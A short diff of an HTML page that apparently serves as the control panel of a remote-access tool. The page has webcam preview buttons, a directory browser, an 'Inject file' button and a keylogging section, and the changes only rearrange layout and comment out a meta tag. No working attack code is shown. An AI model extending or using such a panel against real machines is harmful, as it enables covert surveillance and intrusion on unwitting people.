@@ -2,7 +2,7 @@
 <html>
 
 <head>
-    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+    <!--<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">-->
     <meta charset="utf-8">
     <!--<meta http-equiv="Content-Security-Policy"
         content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; img-src 'self' data: content:;">-->
@@ -21,8 +21,10 @@
     <div class="view" id="webcam_view">
         <div class="title">Webcam</div>
         <video autoplay="true" id="webcam_preview"></video>
-        <button id="stop_video" class="video_btn">stop video</button>
-        <button id="start_video" class="video_btn">start video</button>
+        <div class="btn_wrapper">
+            <button id="stop_video" class="video_btn">stop video</button>
+            <button id="start_video" class="video_btn">start video</button>
+        </div>
     </div>
 
     <!-- directory controls -->
@@ -30,7 +32,9 @@
         <div class="title" id="full_path">Directories</div>
         <div id="back_a_dir" title="go back a directory"></div>
         <div id="dirbox"></div>
-        <button id="inject_file" class="video_btn">Inject file</button>
+        <div class="btn_wrapper">
+            <button id="inject_file" class="video_btn">Inject file</button>
+        </div>
     </div>
 
     <!-- Keylog controls -->
